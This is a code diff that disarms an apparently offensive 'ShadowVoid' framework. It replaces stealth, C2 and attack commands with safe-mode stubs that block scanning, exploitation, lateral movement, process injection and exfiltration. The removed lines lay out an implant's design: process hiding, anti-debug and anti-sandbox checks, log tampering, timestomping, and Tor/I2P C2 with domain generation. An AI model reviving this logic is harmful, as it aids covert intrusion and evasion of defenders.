-        self.framework_name = CONFIG['framework']['name']
-        self.framework_version = CONFIG['framework']['version']
+        self.framework_name = CONFIG["framework"]["name"]
+        self.framework_version = CONFIG["framework"]["version"]
         self.tor_router = None
         self.i2p_router = None
-        self.dga = None
+        self.dga: DomainGenerator | None = None
         self.dead_drops = None
-        self.heartbeat = None
-        self.cipher = None
-        self.c2_connection = None
+        self.heartbeat: HeartbeatManager | None = None
+        self.cipher: AES256GCM | None = None
+        self.c2_connection: C2Connection | None = None
         self.initialize()
 
-    def initialize(self):
+    def initialize(self) -> None:
         self.initialize_stealth()
         self.initialize_crypto()
         self.initialize_memory_resident()
         load_modules()
-        if CONFIG['c2']['enabled']:
+        if CONFIG["c2"]["enabled"]:
             self.initialize_c2()
         self.start_session()
 
-    def initialize_stealth(self):
-        try:
-            if CONFIG['stealth']['process_name']:
-                camouflage_process(CONFIG['stealth']['process_name'])
-            if CONFIG['stealth']['hide_from_ps']:
-                hide_from_ps()
-            if CONFIG['stealth']['scrub_history']:
-                scrub_history()
-            if CONFIG['stealth']['clear_screen']:
-                clear_screen()
-            if CONFIG['stealth']['anti_debug']:
-                anti_debug_check()
-            if CONFIG['stealth']['anti_sandbox']:
-                anti_sandbox_check()
-            if CONFIG['stealth']['timestomping']:
-                timestomping(__file__)
-        except:
-            pass
+    def initialize_stealth(self) -> dict[str, bool]:
+        return {
+            "safe_mode": True,
+            "process_modified": False,
+            "files_modified": False,
+        }
 
-    def initialize_crypto(self):
+    def initialize_crypto(self) -> bool:
         try:
             self.crypto_key = generate_key()
             self.cipher = AES256GCM(self.crypto_key)
-        except:
-            pass
+        except (RuntimeError, ValueError):
+            self.cipher = None
+        return self.cipher is not None
 
-    def initialize_memory_resident(self):
-        """Initialize memory-resident execution capability"""
-        try:
-            make_memory_resident()
-            # Cache core modules in memory
-            modules_dir = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'modules')
-            for name, config in CONFIG['modules'].items():
-                if config['enabled']:
-                    module_path = os.path.join(modules_dir, name + '.py')
-                    cache_module_in_memory(name, module_path)
-            return True
-        except Exception as e:
-            return False
+    def initialize_memory_resident(self) -> bool:
+        return make_memory_resident()
 
-    def initialize_c2(self):
-        try:
-            if CONFIG['c2']['routing']['tor']:
-                self.tor_router = TorRouter(socks_port=CONFIG['c2']['routing']['socks5'].split(':')[1])
-            if CONFIG['c2']['routing']['i2p']:
-                self.i2p_router = I2PRouter()
-            if CONFIG['c2']['dga']['enabled']:
-                self.dga = DomainGenerator(
-                    domains_per_day=CONFIG['c2']['dga']['domains_per_day'],
-                    tlds=CONFIG['c2']['dga']['tlds']
-                )
-            self.dead_drops = DeadDropResolver()
-            # Initialize C2 connection manager
-            self.c2_connection = C2Connection(self)
-            self.c2_connection.initialize_routers()
-            self.c2_connection.start_persistent_connection()
-            # Update heartbeat with C2 connection
-            if CONFIG['c2'].get('heartbeat'):
-                self.heartbeat = HeartbeatManager(
-                    interval=CONFIG['c2']['heartbeat']['interval'],
-                    jitter=CONFIG['c2']['heartbeat']['jitter'],
-                    kill_switch=CONFIG['c2']['heartbeat']['kill_switch'],
-                    c2_connection=self.c2_connection
-                )
-                heartbeat_thread = threading.Thread(target=self.heartbeat.run, daemon=True)
-                heartbeat_thread.start()
-        except:
-            pass
+    def initialize_c2(self) -> bool:
+        self.c2_connection = C2Connection(self)
+        self.dead_drops = DeadDropResolver()
+        self.heartbeat = None
+        return False
 
-    def start_session(self):
-        SESSION['active'] = True
-        SESSION['start_time'] = datetime.now()
-        SESSION['targets'] = []
-        SESSION['compromised'] = []
-        SESSION['last_heartbeat'] = datetime.now()
-        SESSION['kill_switch_triggered'] = False
+    def start_session(self) -> None:
+        SESSION.update(
+            active=True,
+            start_time=datetime.now(timezone.utc),
+            targets=[],
+            compromised=[],
+            last_heartbeat=datetime.now(timezone.utc),
+            kill_switch_triggered=False,
+        )
 
-    def end_session(self):
-        SESSION['active'] = False
+    def end_session(self) -> None:
+        SESSION["active"] = False
         if self.heartbeat:
             self.heartbeat.stop()
         if self.c2_connection:
             self.c2_connection.stop()
-        scrub_history()
-        log_tampering()
-        SESSION['kill_switch_triggered'] = False
 
-    def execute_command(self, command):
-        if not SESSION['active']:
+    def execute_command(self, command: str) -> dict[str, Any]:
+        if not isinstance(command, str) or not command.strip():
+            return {"status": "error", "message": "No command provided"}
+        if not SESSION["active"]:
             self.start_session()
-        parts = command.split()
-        if not parts:
-            return {'status': 'error', 'message': 'No command provided'}
-        cmd = parts[0].lower()
-        args = parts[1:]
-        if cmd == 'init':
-            return self.cmd_init(args)
-        elif cmd == 'scan':
-            return self.cmd_scan(args)
-        elif cmd == 'exploit':
-            return self.cmd_exploit(args)
-        elif cmd == 'pivot':
-            return self.cmd_pivot(args)
-        elif cmd == 'exfil':
-            return self.cmd_exfil(args)
-        elif cmd == 'inject':
-            return self.cmd_inject(args)
-        elif cmd == 'clean':
-            return self.cmd_clean(args)
-        elif cmd == 'modules':
-            return self.cmd_modules(args)
-        elif cmd == 'c2':
-            return self.cmd_c2(args)
-        elif cmd == 'help':
-            return self.cmd_help(args)
-        elif cmd == 'exit':
-            return self.cmd_exit(args)
-        else:
-            return {'status': 'error', 'message': 'Unknown command: ' + cmd}
-
-    def cmd_init(self, args):
         try:
-            self.initialize_stealth()
-            return {'status': 'success', 'message': 'Stealth environment initialized'}
-        except Exception as e:
-            return {'status': 'error', 'message': str(e)}
+            parts = shlex.split(command)
+        except ValueError as exc:
+            return {"status": "error", "message": f"Invalid command syntax: {exc}"}
+        cmd, args = parts[0].lower(), parts[1:]
+        handlers = {
+            "init": self.cmd_init,
+            "scan": self.cmd_scan,
+            "exploit": self.cmd_exploit,
+            "pivot": self.cmd_pivot,
+            "exfil": self.cmd_exfil,
+            "inject": self.cmd_inject,
+            "clean": self.cmd_clean,
+            "modules": self.cmd_modules,
+            "c2": self.cmd_c2,
+            "help": self.cmd_help,
+            "exit": self.cmd_exit,
+        }
+        handler = handlers.get(cmd)
+        if handler is None:
+            return {"status": "error", "message": f"Unknown command: {cmd}"}
+        return handler(args)
 
-    def cmd_scan(self, args):
-        if not args:
-            return {'status': 'error', 'message': 'Target required'}
-        target = args[0]
-        scan_type = args[1] if len(args) > 1 else 'full'
-        recon_module = MODULES.get('recon')
-        if recon_module:
-            recon_instance = recon_module.ReconModule(self)
-            return recon_instance.scan(target, scan_type)
-        return {'status': 'error', 'message': 'Recon module not available'}
+    @staticmethod
+    def _blocked(action: str) -> dict[str, str]:
+        return {
+            "status": "blocked",
+            "action": action,
+            "message": f"{action} is disabled in safe mode",
+        }
 
-    def cmd_exploit(self, args):
-        if not args:
-            return {'status': 'error', 'message': 'CVE required'}
-        cve = args[0]
-        target = args[1] if len(args) > 1 else None
-        exploit_module = MODULES.get('exploit')
-        if exploit_module:
-            exploit_instance = exploit_module.ExploitModule(self)
-            return exploit_instance.execute(cve, target)
-        return {'status': 'error', 'message': 'Exploit module not available'}
+    def cmd_init(self, args: list[str]) -> dict[str, Any]:
+        return self.initialize_stealth()
 
-    def cmd_pivot(self, args):
-        if not args:
-            return {'status': 'error', 'message': 'Target required'}
-        target = args[0]
-        method = args[1] if len(args) > 1 else 'psexec'
-        post_exploit_module = MODULES.get('post_exploit')
-        if post_exploit_module:
-            post_instance = post_exploit_module.PostExploitModule(self)
-            return post_instance.lateral_movement('current', target, method)
-        return {'status': 'error', 'message': 'Post-exploit module not available'}
+    def cmd_scan(self, args: list[str]) -> dict[str, str]:
+        return self._blocked("active scanning")
 
-    def cmd_inject(self, args):
+    def cmd_exploit(self, args: list[str]) -> dict[str, str]:
+        return self._blocked("exploit execution")
+
+    def cmd_pivot(self, args: list[str]) -> dict[str, str]:
+        return self._blocked("lateral movement")
+
+    def cmd_exfil(self, args: list[str]) -> dict[str, str]:
+        return self._blocked("data exfiltration")
+
+    def cmd_inject(self, args: list[str]) -> dict[str, str]:
+        return self._blocked("process injection")
+
+    def cmd_clean(self, args: list[str]) -> dict[str, str]:
+        return {"status": "success", "message": "No destructive cleanup is configured"}
+
+    def cmd_modules(self, args: list[str]) -> dict[str, Any]:
+        if args and args[0].lower() != "list":
+            return {"status": "error", "message": "Invalid modules command"}
+        return {
+            "status": "success",
+            "modules": [
+                {
+                    "name": name,
+                    "status": "loaded" if name in MODULES else "unavailable",
+                    "error": MODULE_LOAD_ERRORS.get(name),
+                }
+                for name in CONFIG["modules"]
+            ],
+        }
+
+    def cmd_c2(self, args: list[str]) -> dict[str, Any]:
         if not args:
-            return {'status': 'error', 'message': 'Command required (migrate/spawn/list/cleanup)'}
+            return {"status": "error", "message": "C2 command required"}
         subcmd = args[0].lower()
-        inject_module = MODULES.get('process_injection')
-        if not inject_module:
-            return {'status': 'error', 'message': 'Process injection module not available'}
-        injector = inject_module.ProcessInjector(self)
-        if subcmd == 'migrate':
-            target = args[1] if len(args) > 1 else 'svchost'
-            return injector.migrate_to_process(target)
-        elif subcmd == 'spawn':
-            target = args[1] if len(args) > 1 else 'svchost'
-            return injector.spawn_and_inject(target)
-        elif subcmd == 'list':
-            processes = injector.list_injectable_processes()
-            return {'status': 'success', 'processes': processes}
-        elif subcmd == 'cleanup':
-            return injector.cleanup()
-        elif subcmd == 'substitute':
-            target = args[1] if len(args) > 1 else 'svchost'
-            return injector.substitute_process(target)
-        else:
-            return {'status': 'error', 'message': f'Unknown inject command: {subcmd}'}
-
-    def cmd_exfil(self, args):
-        if len(args) < 2:
-            return {'status': 'error', 'message': 'Source and destination required'}
-        source = args[0]
-        destination = args[1]
-        channel = args[2] if len(args) > 2 else 'http'
-        post_exploit_module = MODULES.get('post_exploit')
-        if post_exploit_module:
-            post_instance = post_exploit_module.PostExploitModule(self)
-            return post_instance.exfiltrate(source, destination, channel)
-        return {'status': 'error', 'message': 'Post-exploit module not available'}
-
-    def cmd_clean(self, args):
-        try:
-            scrub_history()
-            log_tampering()
-            return {'status': 'success', 'message': 'Logs and artifacts scrubbed'}
-        except Exception as e:
-            return {'status': 'error', 'message': str(e)}
-
-    def cmd_modules(self, args):
-        if not args or args[0] == 'list':
-            modules = [{'name': name, 'status': 'loaded'} for name in MODULES.keys()]
-            return {'status': 'success', 'modules': modules}
-        return {'status': 'error', 'message': 'Invalid modules command'}
-
-    def cmd_c2(self, args):
-        if not args:
-            return {'status': 'error', 'message': 'C2 command required'}
-        subcmd = args[0]
-        if subcmd == 'status':
-            status = {
-                'enabled': CONFIG['c2']['enabled'],
-                'tor': self.tor_router is not None and self.tor_router.is_available(),
-                'i2p': self.i2p_router is not None and self.i2p_router.is_available(),
-                'dga': self.dga is not None,
-                'heartbeat': self.heartbeat is not None,
-                'persistent_connection': self.c2_connection is not None and self.c2_connection.connected
+        if subcmd == "status":
+            return {
+                "status": "success",
+                "c2_status": {
+                    "enabled": False,
+                    "safe_mode": True,
+                    "persistent_connection": False,
+                },
             }
-            return {'status': 'success', 'c2_status': status}
-        elif subcmd == 'generate':
-            if self.dga:
-                count = int(args[1]) if len(args) > 1 else 10
-                domains = self.dga.generate_domains(count)
-                return {'status': 'success', 'domains': domains}
-        return {'status': 'error', 'message': 'Invalid C2 command'}
-
-    def cmd_help(self, args):
-        help_text = "ShadowVoid Framework - Memory-Resident Offensive Security Orchestrator\n\nCOMMANDS:\n  init                    Initialize stealth environment\n  scan <target> [type]   Run reconnaissance\n  exploit <cve> [target] Execute exploit chain\n  pivot <target> [method] Establish lateral movement\n  inject <cmd> [args]    Process injection (migrate/spawn/list/substitute/cleanup)\n  exfil <source> <dest> [channel] Start data exfiltration\n  clean                  Scrub logs and artifacts\n  modules list           List loaded modules\n  c2 status              Show C2 status\n  c2 generate [count]    Generate DGA domains\n  help                   Show this help\n  exit                   End session and exit"
-        return {'status': 'success', 'help': help_text}
-
-    def cmd_exit(self, args):
-        self.end_session()
-        return {'status': 'success', 'message': 'Exiting ShadowVoid Framework'}
-
-
-def main():
-    core = ShadowVoidCore()
-    if len(sys.argv) > 1:
-        command = ' '.join(sys.argv[1:])
-        result = core.execute_command(command)
-        if SESSION.get('kill_switch_triggered'):
-            core.end_session()
-            sys.exit(0)
-        if result:
-            print(json.dumps(result, indent=2))
-    else:
-        print("ShadowVoid Framework - Interactive Mode")
-        print("Type 'help' for commands, 'exit' to quit")
-        while True:
+        if subcmd == "generate":
             try:
-                command = input("sv> ").strip()
-                if not command:
-                    continue
-                if command.startswith('!'):
-                    quick_cmd = command[1:]
-                    if quick_cmd == 'scan':
-                        command = 'scan'
-                    elif quick_cmd == 'exploit':
-                        command = 'exploit'
-                    elif quick_cmd == 'pivot':
-                        command = 'pivot'
-                    elif quick_cmd == 'exfil':
-                        command = 'exfil'
-                    elif quick_cmd == 'inject':
-                        command = 'inject'
-                    elif quick_cmd == 'clean':
-                        command = 'clean'
-                result = core.execute_command(command)
-                if SESSION.get('kill_switch_triggered'):
-                    core.end_session()
-                    break
-                if result:
-                    print(json.dumps(result, indent=2))
-            except (KeyboardInterrupt, EOFError):
-                core.end_session()
+                count = int(args[1]) if len(args) > 1 else 10
+                if count < 0 or count > 100:
+                    raise ValueError
+            except (TypeError, ValueError):
+                return {"status": "error", "message": "count must be an integer from 0 to 100"}
+            generator = DomainGenerator(count, ("example",))
+            return {"status": "success", "domains": generator.generate_domains(count)}
+        return {"status": "error", "message": "Invalid C2 command"}
+
+    def cmd_help(self, args: list[str]) -> dict[str, str]:
+        return {
+            "status": "success",
+            "help": (
+                "ShadowVoid safe assessment runner\n\n"
+                "COMMANDS:\n"
+                "  modules list           List loaded local modules\n"
+                "  c2 status             Show that network C2 is disabled\n"
+                "  c2 generate [count]   Generate offline example names\n"
+                "  scan ...              Blocked in safe mode\n"
+                "  exploit ...           Blocked in safe mode\n"
+                "  pivot ...             Blocked in safe mode\n"
+                "  exfil ...             Blocked in safe mode\n"
+                "  inject ...            Blocked in safe mode\n"
+                "  clean                 No-op cleanup\n"
+                "  exit                  End the local session"
+            ),
+        }
+
+    def cmd_exit(self, args: list[str]) -> dict[str, str]:
+        self.end_session()
+        return {"status": "success", "message": "Session ended"}
+
+
+def main(argv: list[str] | None = None) -> int:
+    argv = list(sys.argv[1:] if argv is None else argv)
+    core = ShadowVoidCore()
+    if argv:
+        command = shlex.join(argv)
+        result = core.execute_command(command)
+        print(json.dumps(result, indent=2, default=str))
+        return 0 if result.get("status") != "error" else 2
+
+    print("ShadowVoid safe assessment runner")
+    print("Type 'help' for commands, or 'exit' to quit")
+    try:
+        while SESSION["active"]:
+            command = input("sv> ").strip()
+            if not command:
+                continue
+            if command.startswith("!"):
+                command = command[1:]
+            result = core.execute_command(command)
+            print(json.dumps(result, indent=2, default=str))
+            if command.split(maxsplit=1)[0].lower() == "exit":
                 break
-            except Exception as e:
-                print('Error: ' + str(e))
+    except (EOFError, KeyboardInterrupt):
+        core.end_session()
+    return 0
 
 
-if __name__ == '__main__':
-    main()
+if __name__ == "__main__":
+    raise SystemExit(main())
